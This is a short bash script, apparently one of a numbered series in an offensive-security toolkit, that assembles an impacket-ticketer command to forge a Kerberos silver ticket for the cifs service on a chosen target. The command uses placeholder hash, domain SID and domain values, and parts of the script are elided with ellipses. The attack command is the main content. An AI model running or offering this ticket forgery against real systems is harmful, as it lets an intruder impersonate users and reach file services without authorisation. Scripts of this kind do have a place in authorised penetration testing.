#!/usr/bin/env bash
# V-101.sh — PAC Tampering / Silver ticket abuse
# Category: Host, Software and internal architecture
# Tool: impacket-ticketer
# Usage: bash V-101.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-101.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-101.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-101.sh <session> <target>}"
...
CMD="impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN -spn cifs/$TARGET silver"

echo "[hex] V-101: PAC Tampering / Silver ticket abuse → $TARGET"
...
python3 - \
    ...
    "V-101" "PAC Tampering / Silver ticket abuse" "Host, Software and internal architecture" "impacket-ticketer" \
